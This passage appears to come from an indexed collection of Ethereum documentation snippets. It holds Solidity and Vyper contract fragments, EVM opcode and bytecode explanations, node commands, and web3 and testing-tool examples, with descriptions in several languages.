forts\nDESCRIPTION: Illustration de la différence entre un mot de passe faible et un mot de passe fort, montrant comment les mots de passe forts utilisent une combinaison complexe de caractères plutôt que des mots communs.\n\nLANGUAGE: markdown\nCODE:\n```\nExemple de mot de passe faible : CuteFluffyKittens!\n\nExemple de mot de passe fort : ymv\\*azu.EAC8eyp8umf\n```\n\n----------------------------------------\n\nTITLE: ERC20 Deposit Wrapper Functions in Solidity\nDESCRIPTION: These two wrapper functions expose the ERC20 deposit functionality to external callers. The first function (depositERC20) deposits tokens to the same address on L2, while the second (depositERC20To) allows specifying a different recipient on L2.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @inheritdoc IL1ERC20Bridge\n */\nfunction depositERC20(\n    .\n    .\n    .\n) external virtual onlyEOA {\n    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, msg.sender, _amount, _l2Gas, _data);\n}\n\n/**\n * @inheritdoc IL1ERC20Bridge\n */\nfunction depositERC20To(\n    .\n    .\n    .\n) external virtual {\n    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, _to, _amount, _l2Gas, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Project Structure for NFT Development\nDESCRIPTION: Commands to create the necessary folders for organizing an NFT project, including a contracts directory for smart contract code and a scripts directory for deployment scripts.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir my-nft\ncd my-nft\n```\n\n----------------------------------------\n\nTITLE: Retrieving the latest block number with callback\nDESCRIPTION: A complete example demonstrating how to retrieve the latest block number from the Ethereum blockchain using a callback function. This shows the basic pattern for making asynchronous calls with web3.js.\n\nLANGUAGE: javascript\nCODE:\n```\nvar Web3 = require(\"web3\")\nconst web3 = new Web3(\"https://cloudflare-eth.com\")\n\nweb3.eth.getBlockNumber(function (error, result) {\n  console.log(result)\n})\n```\n\n----------------------------------------\n\nTITLE: Defining Cache Size Array for Ethereum Memory Management\nDESCRIPTION: This code snippet defines the 'cache_sizes' array containing memory size values in bytes, ranging from approximately 16MB to 68MB. The array likely represents different cache size configurations used for memory optimization in the Ethereum project.\n\nLANGUAGE: unknown\nCODE:\n```\ncache_sizes = [\n16776896, 16907456, 17039296, 17170112, 17301056, 17432512, 17563072,\n17693888, 17824192, 17955904, 18087488, 18218176, 18349504, 18481088,\n18611392, 18742336, 18874304, 19004224, 19135936, 19267264, 19398208,\n19529408, 19660096, 19791424, 19922752, 20053952, 20184896, 20315968,\n20446912, 20576576, 20709184, 20840384, 20971072, 21102272, 21233216,\n21364544, 21494848, 21626816, 21757376, 21887552, 22019392, 22151104,\n22281536, 22412224, 22543936, 22675264, 22806464, 22935872, 23068096,\n23198272, 23330752, 23459008, 23592512, 23723968, 23854912, 23986112,\n24116672, 24247616, 24378688, 24509504, 24640832, 24772544, 24903488,\n25034432, 25165376, 25296704, 25427392, 25558592, 25690048, 25820096,\n25951936, 26081728, 26214208, 26345024, 26476096, 26606656, 26737472,\n26869184, 26998208, 27131584, 27262528, 27393728, 27523904, 27655744,\n27786688, 27917888, 28049344, 28179904, 28311488, 28441792, 28573504,\n28700864, 28835648, 28966208, 29096768, 29228608, 29359808, 29490752,\n29621824, 29752256, 29882816, 30014912, 30144448, 30273728, 30406976,\n30538432, 30670784, 30799936, 30932672, 31063744, 31195072, 31325248,\n31456192, 31588288, 31719232, 31850432, 31981504, 32110784, 32243392,\n32372672, 32505664, 32636608, 32767808, 32897344, 33029824, 33160768,\n33289664, 33423296, 33554368, 33683648, 33816512, 33947456, 34076992,\n34208704, 34340032, 34471744, 34600256, 34734016, 34864576, 34993984,\n35127104, 35258176, 35386688, 35518528, 35650624, 35782336, 35910976,\n36044608, 36175808, 36305728, 36436672, 36568384, 36699968, 36830656,\n36961984, 37093312, 37223488, 37355072, 37486528, 37617472, 37747904,\n37879232, 38009792, 38141888, 38272448, 38403392, 38535104, 38660672,\n38795584, 38925632, 39059264, 39190336, 39320768, 39452096, 39581632,\n39713984, 39844928, 39974848, 40107968, 40238144, 40367168, 40500032,\n40631744, 40762816, 40894144, 41023552, 41155904, 41286208, 41418304,\n41547712, 41680448, 41811904, 41942848, 42073792, 42204992, 42334912,\n42467008, 42597824, 42729152, 42860096, 42991552, 43122368, 43253696,\n43382848, 43515712, 43646912, 43777088, 43907648, 44039104, 44170432,\n44302144, 44433344, 44564288, 44694976, 44825152, 44956864, 45088448,\n45219008, 45350464, 45481024, 45612608, 45744064, 45874496, 46006208,\n46136768, 46267712, 46399424, 46529344, 46660672, 46791488, 46923328,\n47053504, 47185856, 47316928, 47447872, 47579072, 47710144, 47839936,\n47971648, 48103232, 48234176, 48365248, 48496192, 48627136, 48757312,\n48889664, 49020736, 49149248, 49283008, 49413824, 49545152, 49675712,\n49807168, 49938368, 50069056, 50200256, 50331584, 50462656, 50593472,\n50724032, 50853952, 50986048, 51117632, 51248576, 51379904, 51510848,\n51641792, 51773248, 51903296, 52035136, 52164032, 52297664, 52427968,\n52557376, 52690112, 52821952, 52952896, 53081536, 53213504, 53344576,\n53475776, 53608384, 53738816, 53870528, 54000832, 54131776, 54263744,\n54394688, 54525248, 54655936, 54787904, 54918592, 55049152, 55181248,\n55312064, 55442752, 55574336, 55705024, 55836224, 55967168, 56097856,\n56228672, 56358592, 56490176, 56621888, 56753728, 56884928, 57015488,\n57146816, 57278272, 57409216, 57540416, 57671104, 57802432, 57933632,\n58064576, 58195264, 58326976, 58457408, 58588864, 58720192, 58849984,\n58981696, 59113024, 59243456, 59375552, 59506624, 59637568, 59768512,\n59897792, 60030016, 60161984, 60293056, 60423872, 60554432, 60683968,\n60817216, 60948032, 61079488, 61209664, 61341376, 61471936, 61602752,\n61733696, 61865792, 61996736, 62127808, 62259136, 62389568, 62520512,\n62651584, 62781632, 62910784, 63045056, 63176128, 63307072, 63438656,\n63569216, 63700928, 63831616, 63960896, 64093888, 64225088, 64355392,\n64486976, 64617664, 64748608, 64879424, 65009216, 65142464, 65273792,\n65402816, 65535424, 65666752, 65797696, 65927744, 66060224, 66191296,\n66321344, 66453056, 66584384, 66715328, 66846656, 66977728, 67108672,\n67239104, 67370432, 67501888, 67631296, 67763776, 67895104, 68026304,\n68157248, 68287936, 68419264, 68548288, 68681408, 68811968, 68942912,\n```\n\n----------------------------------------\n\nTITLE: Accessing Workspace Directory in Manticore\nDESCRIPTION: This code shows how to access the workspace directory in Manticore, which is used as the output directory for all generated files during analysis.\n\nLANGUAGE: python\nCODE:\n```\nprint(\"Results are in {}\".format(m.workspace))\n```\n\n----------------------------------------\n\nTITLE: CALLDATALOAD Opcode in EVM\nDESCRIPTION: The CALLDATALOAD opcode loads a 32-byte word from the call data. It takes an index from the stack and returns a 32-byte word from the message data starting at that index.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nmsg.data[idx:idx+32]\n```\n\n----------------------------------------\n\nTITLE: Running Reth Execution Client on Ethereum Mainnet\nDESCRIPTION: Command to start Reth node on Ethereum Mainnet with default data location. It configures authentication settings for Engine RPC to allow connections from a consensus client running on localhost.\n\nLANGUAGE: sh\nCODE:\n```\nreth node \\\n    --authrpc.jwtsecret /path/to/jwtsecret \\\n    --authrpc.addr 127.0.0.1 \\\n    --authrpc.port 8551\n```\n\n----------------------------------------\n\nTITLE: Simple Smart Contract Example with Revert Condition\nDESCRIPTION: A simple Solidity smart contract that contains a function that reverts when a specific condition is met, used as the target for Manticore analysis examples.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.24 <0.6.0;\ncontract Simple {\n    function f(uint a) payable public{\n        if (a == 65) {\n            revert();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Transaction Reversion with Waffle\nDESCRIPTION: TypeScript test case that verifies if the split function is reverted when an uneven wei amount is provided. Uses Waffle's revertedWith matcher to check the error message.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Reverts when Vei amount uneven\", async () => {\n  await expect(splitter.split({ value: 51 })).to.be.revertedWith(\n    \"Uneven wei amount not allowed\"\n  )\n})\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Overflow Condition Checking\nDESCRIPTION: Continuation of the overflow protection logic. This code checks if the stored value is less than or equal to (2^256 - callvalue - 1) to prevent an overflow when adding the values.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Offset | Código de operación | Pila                                                                            |\n| ------:| ------------------- | ------------------------------------------------------------------------------- |\n|    1AC | DUP3                | Value\\* 2^256-CALLVALUE-1 0x00 Value\\* CALLVALUE 0x75 0 6 CALLVALUE         |\n|    1AD | GT                  | Value\\*>2^256-CALLVALUE-1 0x00 Value\\* CALLVALUE 0x75 0 6 CALLVALUE         |\n|    1AE | ISZERO              | Value\\*\\<=2^256-CALLVALUE-1 0x00 Value\\* CALLVALUE 0x75 0 6 CALLVALUE        |\n|    1AF | PUSH2 0x01df        | 0x01DF Value\\*\\<=2^256-CALLVALUE-1 0x00 Value\\* CALLVALUE 0x75 0 6 CALLVALUE |\n|    1B2 | JUMPI               |                                                                                 |\n```\n\n----------------------------------------\n\nTITLE: Implementing Lock Modifier for Reentrancy Protection\nDESCRIPTION: Defines a function modifier that prevents reentrancy by ensuring a function cannot be called while it's still executing. Sets unlocked to 0 during execution and back to 1 after completion.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier lock() {\n    require(unlocked == 1, 'UniswapV2: LOCKED');\n    unlocked = 0;\n    _;\n    unlocked = 1;\n}\n```\n\n----------------------------------------\n\nTITLE: Transfert de jetons ERC20 avec la méthode transfer\nDESCRIPTION: Envoi d'une transaction pour transférer 100 DAI (avec 18 décimales) d'une adresse à une autre en utilisant la méthode transfer du contrat.\n\nLANGUAGE: javascript\nCODE:\n```\ndaiToken.methods\n  .transfer(receiverAddress, \"100000000000000000000\")\n  .send({ from: senderAddress }, function (err, res) {\n    if (err) {\n      console.log(\"An error occurred\", err)\n      return\n    }\n    console.log(\"Hash of the transaction: \" + res)\n  })\n```\n\n----------------------------------------\n\nTITLE: Pair Address Calculation with CREATE2\nDESCRIPTION: Calculates the deterministic address of a Uniswap pair exchange for two tokens using the CREATE2 opcode. This enables efficient address lookup without requiring external calls to the factory contract.\n\nLANGUAGE: solidity\nCODE:\n```\n    // calculates the CREATE2 address for a pair without making any external calls\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = address(uint(keccak256(abi.encodePacked(\n                hex'ff',\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n            ))));\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Airdrop Claim Function in Python Decompiled from Solidity\nDESCRIPTION: A decompiled function that handles token claims in an airdrop. It verifies the window is valid, checks if the address has already claimed, validates a merkle proof, and transfers ETH or WETH to the recipient.\n\nLANGUAGE: python\nCODE:\n```\ndef unknown2e7ba6ef(uint256 _param1, uint256 _param2, uint256 _param3, array _param4) payable:\n  ...\n  require _param2 == addr(_param2)\n  ...\n  if currentWindow <= _param1:\n      revert with 0, 'cannot claim for a future window'\n```\n\n----------------------------------------\n\nTITLE: Defining IL1StandardBridge Interface for ETH and ERC-20 Bridging\nDESCRIPTION: Interface that extends IL1ERC20Bridge to add ETH bridging functionality. This separation allows custom ERC-20 bridges to implement only IL1ERC20Bridge without having to handle ETH.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >0.5.0 <0.9.0;\n\nimport \"./IL1ERC20Bridge.sol\";\n\n/**\n * @title IL1StandardBridge\n */\ninterface IL1StandardBridge is IL1ERC20Bridge {\n    /**********\n     * Events *\n     **********/\n    event ETHDepositInitiated(\n        address indexed _from,\n        address indexed _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: Implementing safeTransferFrom in ERC-721 Vyper Contract\nDESCRIPTION: A safer version of transferFrom that verifies the receiver is capable of handling ERC-721 tokens if it's a contract. It calls onERC721Received on the receiving contract and confirms the correct return value.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef safeTransferFrom(\n        _from: address,\n        _to: address,\n        _tokenId: uint256,\n        _data: Bytes[1024]=b\"\"\n    ):\n    \"\"\"\n    @dev Transfers the ownership of an NFT from one address to another address.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the\n         approved address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n         If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n         the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n         NOTE: bytes4 is represented by bytes32 with padding\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    @param _data Additional data with no specified format, sent in call to `_to`.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_syncing en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir l'état de synchronisation du nœud en utilisant la méthode eth_syncing. Renvoie soit un objet avec les données de synchronisation, soit false si le nœud n'est pas en cours de synchronisation.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_syncing\",\"params\":[],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": {\n    startingBlock: '0x384',\n    currentBlock: '0x386',\n    highestBlock: '0x454'\n  }\n}\n// Or when not syncing\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Key-to-Value Storage in Cache Write Function\nDESCRIPTION: Implementation for storing the actual value in the cache array and returning its assigned key.\n\nLANGUAGE: solidity\nCODE:\n```\n        key2val.push(_value);\n\n        return key2val.length;\n    }  // cacheWrite\n```\n\n----------------------------------------\n\nTITLE: Implementing safeTransferFrom in ERC-721 Vyper Contract\nDESCRIPTION: A safer version of transferFrom that verifies the receiver is capable of handling ERC-721 tokens if it's a contract. It calls onERC721Received on the receiving contract and confirms the correct return value.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef safeTransferFrom(\n        _from: address,\n        _to: address,\n        _tokenId: uint256,\n        _data: Bytes[1024]=b\"\"\n    ):\n    \"\"\"\n    @dev Transfers the ownership of an NFT from one address to another address.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the\n         approved address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n         If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n         the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n         NOTE: bytes4 is represented by bytes32 with padding\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    @param _data Additional data with no specified format, sent in call to `_to`.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Running Besu Execution Client on Ethereum Mainnet\nDESCRIPTION: Command to start Hyperledger Besu on Ethereum Mainnet with basic configuration. It enables JSON-RPC, Engine RPC for consensus client connections, and specifies authentication settings.\n\nLANGUAGE: sh\nCODE:\n```\nbesu --network=mainnet \\\n    --data-path=/data/ethereum \\\n    --rpc-http-enabled=true \\\n    --engine-rpc-enabled=true \\\n    --engine-host-allowlist=\"*\" \\\n    --engine-jwt-enabled=true \\\n    --engine-jwt-secret=/path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Retrieving Current Gas Price from Network\nDESCRIPTION: JavaScript code to get the current gas price from the Ethereum network for transaction fee calculation.\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.ethersProvider.getGasPrice() // gasPrice\n```\n\n----------------------------------------\n\nTITLE: Contract Detection in Solidity via Assembly\nDESCRIPTION: Internal view function to determine if an address is a contract by checking its code size using inline assembly. Returns true if the address contains code, indicating it's a contract.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction isContract(address account) internal view returns (bool) {\n    uint256 size;\n    // Currently there is no better way to check if there is a contract in an address\n    // than to check the size of the code at that address.\n    // Consultă https://ethereum.stackexchange.com/a/14016/36603\n    // pentru mai multe detalii despre cum funcționează acest lucru.\n    // DE_FĂCUT Verifică din nou acest lucru înainte de lansarea Serenity, deoarece toate adresele vor fi\n    // contracte atunci.\n    // solium-disable-next-line security/no-inline-assembly\n    assembly {\n        size := extcodesize(account)\n    }\n    return size > 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Identifying Hardcoded Addresses in Scam wARB Token\nDESCRIPTION: This snippet shows how the scam wARB token uses hardcoded addresses for the deployer and contract owner, indicating a short-term operation rather than a long-term legitimate token.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract WrappedArbitrum is Context, IERC20 {\n    .\n    .\n    .\n    address deployer = 0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1;\n    address public contract_owner = 0xb40dE7b1beE84Ff2dc22B70a049A07A13a411A33;\n    .\n    .\n    .\n}\n```\n\n----------------------------------------\n\nTITLE: Emitting Transfer Event in ERC-20\nDESCRIPTION: Emits a Transfer event after the token transfer is completed. External applications can listen for these events to track token movements.\n\nLANGUAGE: solidity\nCODE:\n```\nemit Transfer(sender, recipient, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Usando delegatecall() para Padrões de Proxy em Solidity\nDESCRIPTION: Exemplo de como o método delegatecall() é usado em padrões de proxy para contratos atualizáveis. Esta função de baixo nível permite executar o código de um contrato lógico no contexto do contrato de proxy, preservando o estado e os valores originais de msg.sender e msg.value.\n\nLANGUAGE: Solidity\nCODE:\n```\ndelegatecall()\n```\n\n----------------------------------------\n\nTITLE: BYTE Opcode in EVM\nDESCRIPTION: The BYTE opcode extracts a single byte from a word. It takes an index i and a value x from the stack, and returns the ith byte of x, counting from the left (most significant byte).\n\nLANGUAGE: evm-assembly\nCODE:\n```\n(x >> (248 - i * 8)) && 0xFF\n```\n\n----------------------------------------\n\nTITLE: Visualizing Git Branching Strategy for Hotfixes in Ethereum.org\nDESCRIPTION: ASCII diagram showing the Git branch structure for handling urgent hotfixes in production, illustrating how fixes are created from master and then merged back to all branches.\n\nLANGUAGE: plaintext\nCODE:\n```\n    hotfix O - - - O\n\n         /           \\\n\nmaster  O - - - - - - - O (tag)\n\n        |               |\n\nstaging O - - - - - - - O\n\n        |               |\n\ndev     O - - O - - - - O\n```\n\n----------------------------------------\n\nTITLE: Defining Solidity Version for L1StandardBridge Contract\nDESCRIPTION: Specifies the Solidity compiler version to be used for the L1StandardBridge contract. The contract uses a strict version requirement of 0.8.9 or higher.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n```\n\n----------------------------------------\n\nTITLE: Implementing NFT Minting Function in Vyper\nDESCRIPTION: This function allows the designated minter to create new tokens and assign them to specific addresses. It includes checks to ensure only the minter can call it, the recipient is valid, and the token ID isn't already in use.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef mint(_to: address, _tokenId: uint256) -> bool:\n    \"\"\"\n    @dev Function to mint tokens\n         Throws if `msg.sender` is not the minter.\n         Throws if `_to` is zero address.\n         Throws if `_tokenId` is owned by someone.\n    @param _to The address that will receive the minted tokens.\n    @param _tokenId The token id to mint.\n    @return A boolean that indicates if the operation was successful.\n    \"\"\"\n    # Throws if `msg.sender` is not the minter\n    assert msg.sender == self.minter\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Redemption Limit in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function returns the maximum amount of shares that can be redeemed from the owner's balance in a single redeem call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxRedeem(address owner) public view returns (uint256 maxShares)\n```\n\n----------------------------------------\n\nTITLE: Creating Array for Parameter Storage\nDESCRIPTION: Implementation for allocating memory to store multiple parameters read from calldata based on expected parameter count.\n\nLANGUAGE: solidity\nCODE:\n```\n        // The parameters we read\n        uint[] memory params = new uint[](_paramNum);\n\n        // Parameters start at byte 4, before that it's the function signature\n        uint _atByte = 4;\n\n        for(uint i=0; i<_paramNum; i++) {\n            (_atByte, params[i]) = _readParam(_atByte);\n        }\n```\n\n----------------------------------------\n\nTITLE: Implementing NFT Transfer Function in Vyper\nDESCRIPTION: This function transfers NFT ownership from one address to another. It ensures the sender is authorized and validates both source and destination addresses. This is the basic transfer implementation without additional safety checks.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef transferFrom(_from: address, _to: address, _tokenId: uint256):\n    \"\"\"\n    @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n    @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else\n            they maybe be permanently lost.\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Inheriting Contract with Test Property\nDESCRIPTION: A test contract that inherits from the Token contract and adds a property to verify that balances never exceed 1000 tokens. This separation of concerns keeps testing logic separate from the main contract.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract TestToken is Token{\n      function echidna_balance_under_1000() public view returns(bool){\n            return balances[msg.sender] <= 1000;\n      }\n  }\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Withdrawal Functions in Solidity\nDESCRIPTION: Public withdrawal functions that allow users to initiate token transfers from L2 to L1. These functions support both withdrawing to the sender's address and withdrawing to a specified address.\n\nLANGUAGE: solidity\nCODE:\n```\n    /***************\n     * Withdrawing *\n     ***************/\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function withdraw(\n        address _l2Token,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) external virtual {\n        _initiateWithdrawal(_l2Token, msg.sender, msg.sender, _amount, _l1Gas, _data);\n    }\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function withdrawTo(\n        address _l2Token,\n        address _to,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) external virtual {\n        _initiateWithdrawal(_l2Token, msg.sender, _to, _amount, _l1Gas, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Burning Liquidity Tokens in Uniswap V2 (Solidity)\nDESCRIPTION: Function that burns liquidity tokens when a liquidity provider withdraws from the pool. It returns a proportional amount of both tokens based on the liquidity tokens burned relative to the total supply.\n\nLANGUAGE: solidity\nCODE:\n```\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(address to) external lock returns (uint amount0, uint amount1) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n```\n\n----------------------------------------\n\nTITLE: Defining a Subgraph Manifest in YAML\nDESCRIPTION: Configuration file for The Graph protocol that defines which smart contracts to index, which events to listen for, and which handler functions to call. This example configures indexing for the GameContract with event handling for the PlacedBet event.\n\nLANGUAGE: yaml\nCODE:\n```\nspecVersion: 0.0.1\ndescription: Placing Bets on Ethereum\nrepository: - GitHub link -\nschema:\n  file: ./schema.graphql\ndataSources:\n  - kind: ethereum/contract\n    name: GameContract\n    network: mainnet\n    source:\n      address: '0x2E6454...cf77eC'\n      abi: GameContract\n      startBlock: 6175244\n    mapping:\n      kind: ethereum/events\n      apiVersion: 0.0.1\n      language: wasm/assemblyscript\n      entities:\n        - GameContract\n      abis:\n        - name: GameContract\n          file: ../build/contracts/GameContract.json\n      eventHandlers:\n        - event: PlacedBet(address,uint256,bool)\n          handler: handleNewBet\n      file: ./src/mapping.ts\n```\n\n----------------------------------------\n\nTITLE: Verifying Authorization for Approval in Vyper\nDESCRIPTION: This code checks if the message sender is either the token owner or an approved operator for the owner. Only authorized addresses can set approvals for NFT transfers.\n\nLANGUAGE: python\nCODE:\n```\n    # Check requirements\n    senderIsOwner: bool = self.idToOwner[_tokenId] == msg.sender\n    senderIsApprovedForAll: bool = (self.ownerToOperators[owner])[msg.sender]\n    assert (senderIsOwner or senderIsApprovedForAll)\n```\n\n----------------------------------------\n\nTITLE: Static Analyzer Exemption for Slither in Solidity\nDESCRIPTION: Contains a directive to disable specific Slither static analyzer checks (reentrancy-events and reentrancy-benign) for the following line. These are false positives as the implementation is trusted.\n\nLANGUAGE: solidity\nCODE:\n```\n    ) internal {\n        // slither-disable-next-line reentrancy-events, reentrancy-benign\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Deposit Function Wrappers in Ethereum Bridge\nDESCRIPTION: These two public functions serve as wrappers around the internal _initiateERC20Deposit function. The depositERC20 function deposits tokens to the sender's own address on L2, while depositERC20To allows specifying a different recipient address on L2.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @inheritdoc IL1ERC20Bridge\n */\nfunction depositERC20(\n    .\n    .\n    .\n) external virtual onlyEOA {\n    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, msg.sender, _amount, _l2Gas, _data);\n}\n\n/**\n * @inheritdoc IL1ERC20Bridge\n */\nfunction depositERC20To(\n    .\n    .\n    .\n) external virtual {\n    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, _to, _amount, _l2Gas, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Constructor for ERC-721 Vyper Contract\nDESCRIPTION: Implements the constructor function that initializes the contract. It sets up supported interfaces (ERC-165 and ERC-721) and assigns the contract deployer as the minter who can create new tokens.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef __init__():\n    \"\"\"\n    @dev Contract constructor.\n    \"\"\"\n    self.supportedInterfaces[ERC165_INTERFACE_ID] = True\n    self.supportedInterfaces[ERC721_INTERFACE_ID] = True\n    self.minter = msg.sender\n```\n\n----------------------------------------\n\nTITLE: Return Value Preparation in 0x81e580d3 Function\nDESCRIPTION: The final stack operations that prepare the return value from the lookup table before jumping to the return handling code.\n\nLANGUAGE: evm bytecode\nCODE:\n```\n18B | SWAP1  | calldataload(4) Storage[(((SHA3 of 0x00-0x1F))) + calldataload(4)] 0xDA\n18C | POP    | Storage[(((SHA3 of 0x00-0x1F))) + calldataload(4)] 0xDA\n18D | DUP2   | 0xDA Storage[(((SHA3 of 0x00-0x1F))) + calldataload(4)] 0xDA\n18E | JUMP   | Storage[(((SHA3 of 0x00-0x1F))) + calldataload(4)] 0xDA\n```\n\n----------------------------------------\n\nTITLE: Obtendo Detalhes da Transação Ethereum com Web3.py\nDESCRIPTION: Recupera informações detalhadas sobre uma transação específica usando seu hash de transação, incluindo os endereços envolvidos, valor transferido e bloco em que foi incluída.\n\nLANGUAGE: python\nCODE:\n```\nw3.eth.get_transaction(tx_hash)\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Development\nDESCRIPTION: Configuration file for Hardhat that sets up the Solidity version, specifies Goerli as the default network, and imports environment variables for the Alchemy API URL and private key.\n\nLANGUAGE: javascript\nCODE:\n```\n/**\n * @type import('hardhat/config').HardhatUserConfig\n */\n\nrequire(\"dotenv\").config()\nrequire(\"@nomiclabs/hardhat-ethers\")\n\nconst { API_URL, PRIVATE_KEY } = process.env\n\nmodule.exports = {\n  solidity: \"0.7.3\",\n  defaultNetwork: \"goerli\",\n  networks: {\n    hardhat: {},\n    goerli: {\n      url: API_URL,\n      accounts: [`0x${PRIVATE_KEY}`],\n    },\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Determining Swap Amounts for Token Pair\nDESCRIPTION: Determines the correct amount configuration for the swap based on the token order. Since Uniswap pairs require amounts to be in a specific order, this code ensures tokens are properly arranged.\n\nLANGUAGE: solidity\nCODE:\n```\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n```\n\n----------------------------------------\n\nTITLE: Deposit Finalization in L2StandardBridge in Solidity\nDESCRIPTION: Handles the finalization of deposits from L1 to L2, validating the cross-domain message origin and token contract compatibility before minting L2 tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n    /************************************\n     * Cross-chain Function: Depositing *\n     ************************************/\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function finalizeDeposit(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external virtual 